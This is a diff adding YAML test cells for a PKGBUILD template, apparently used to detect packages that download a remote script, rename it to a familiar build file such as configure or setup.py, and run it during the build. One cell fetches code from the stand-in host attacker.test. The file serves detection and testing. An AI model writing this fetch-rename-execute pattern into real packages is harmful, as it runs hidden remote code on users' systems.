@@ -1,0 +1,86 @@
+template: template.PKGBUILD
+cells:
+- id: configure-rename-executed
+  vars:
+    url: https://github.com/example/harness-baseline
+    source: "'https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz'\n        'configure::https://github.com/example/harness-baseline/raw/main/setup'"
+    sums: "'1111111111111111111111111111111111111111111111111111111111111111'\n            '2222222222222222222222222222222222222222222222222222222222222222'"
+    dir: harness-baseline-1.0.0
+    payload: "  sh ./configure --prefix=/usr\n  make"
+- id: setup-py-rename-executed
+  vars:
+    url: https://github.com/example/harness-baseline
+    source: "'https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz'\n        'setup.py::https://github.com/example/harness-baseline/raw/main/setup'"
+    sums: "'1111111111111111111111111111111111111111111111111111111111111111'\n            '2222222222222222222222222222222222222222222222222222222222222222'"
+    dir: harness-baseline-1.0.0
+    payload: "  python3 setup.py build\n  make"
+- id: makefile-pl-rename-executed
+  vars:
+    url: https://github.com/example/harness-baseline
+    source: "'https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz'\n        'Makefile.PL::https://github.com/example/harness-baseline/raw/main/setup'"
+    sums: "'1111111111111111111111111111111111111111111111111111111111111111'\n            '2222222222222222222222222222222222222222222222222222222222222222'"
+    dir: harness-baseline-1.0.0
+    payload: "  perl Makefile.PL\n  make"
+- id: build-pl-rename-executed
+  vars:
+    url: https://github.com/example/harness-baseline
+    source: "'https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz'\n        'Build.PL::https://github.com/example/harness-baseline/raw/main/setup'"
+    sums: "'1111111111111111111111111111111111111111111111111111111111111111'\n            '2222222222222222222222222222222222222222222222222222222222222222'"
+    dir: harness-baseline-1.0.0
+    payload: "  perl Build.PL\n  make"
+- id: autogen-sh-rename-executed
+  vars:
+    url: https://github.com/example/harness-baseline
+    source: "'https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz'\n        'autogen.sh::https://github.com/example/harness-baseline/raw/main/setup'"
+    sums: "'1111111111111111111111111111111111111111111111111111111111111111'\n            '2222222222222222222222222222222222222222222222222222222222222222'"
+    dir: harness-baseline-1.0.0
+    payload: "  sh ./autogen.sh\n  make"
+- id: bootstrap-sh-rename-executed
+  vars:
+    url: https://github.com/example/harness-baseline
+    source: "'https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz'\n        'bootstrap.sh::https://github.com/example/harness-baseline/raw/main/setup'"
+    sums: "'1111111111111111111111111111111111111111111111111111111111111111'\n            '2222222222222222222222222222222222222222222222222222222222222222'"
+    dir: harness-baseline-1.0.0
+    payload: "  sh ./bootstrap.sh\n  make"
+- id: attacker-host-configure-rename
+  vars:
+    url: https://evil.example/harness-baseline
+    source: "'https://evil.example/harness-baseline-1.0.tar.gz'\n        'configure::https://attacker.test/raw/main/setup'"
+    sums: "'1111111111111111111111111111111111111111111111111111111111111111'\n            '2222222222222222222222222222222222222222222222222222222222222222'"
+    dir: harness-baseline-1.0.0
+    payload: "  sh ./configure\n  make"
+- id: rename-with-version-bump
+  vars:
+    url: https://github.com/example/harness-baseline
+    source: "'https://github.com/example/harness-baseline/archive/v1.0.1.tar.gz'\n        'configure::https://github.com/example/harness-baseline/raw/main/setup'"
+    sums: "'3333333333333333333333333333333333333333333333333333333333333333'\n            '2222222222222222222222222222222222222222222222222222222222222222'"
+    dir: harness-baseline-1.0.1
+    payload: "  sh ./configure\n  make"
+- id: ctl-nonbenign-rename
+  vars:
+    url: https://github.com/example/harness-baseline
+    source: "'https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz'\n        'payload::https://github.com/example/harness-baseline/raw/main/setup'"
+    sums: "'1111111111111111111111111111111111111111111111111111111111111111'\n            '2222222222222222222222222222222222222222222222222222222222222222'"
+    dir: harness-baseline-1.0.0
+    payload: "  sh ./payload\n  make"
+- id: ctl-no-rename
+  vars:
+    url: https://github.com/example/harness-baseline
+    source: "'https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz'\n        'https://github.com/example/harness-baseline/raw/main/setup'"
+    sums: "'1111111111111111111111111111111111111111111111111111111111111111'\n            '2222222222222222222222222222222222222222222222222222222222222222'"
+    dir: harness-baseline-1.0.0
+    payload: "  sh ./setup\n  make"
+- id: ctl-short-checksum-array
+  vars:
+    url: https://github.com/example/harness-baseline
+    source: "'https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz'\n        'configure::https://github.com/example/harness-baseline/raw/main/setup'"
+    sums: '''1111111111111111111111111111111111111111111111111111111111111111'''
+    dir: harness-baseline-1.0.0
+    payload: "  sh ./configure\n  make"
+- id: ctl-skip-in-renamed-slot
+  vars:
+    url: https://github.com/example/harness-baseline
+    source: "'https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz'\n        'configure::https://github.com/example/harness-baseline/raw/main/setup'"
+    sums: "'SKIP'\n            '2222222222222222222222222222222222222222222222222222222222222222'"
+    dir: harness-baseline-1.0.0
+    payload: "  sh ./configure\n  make"
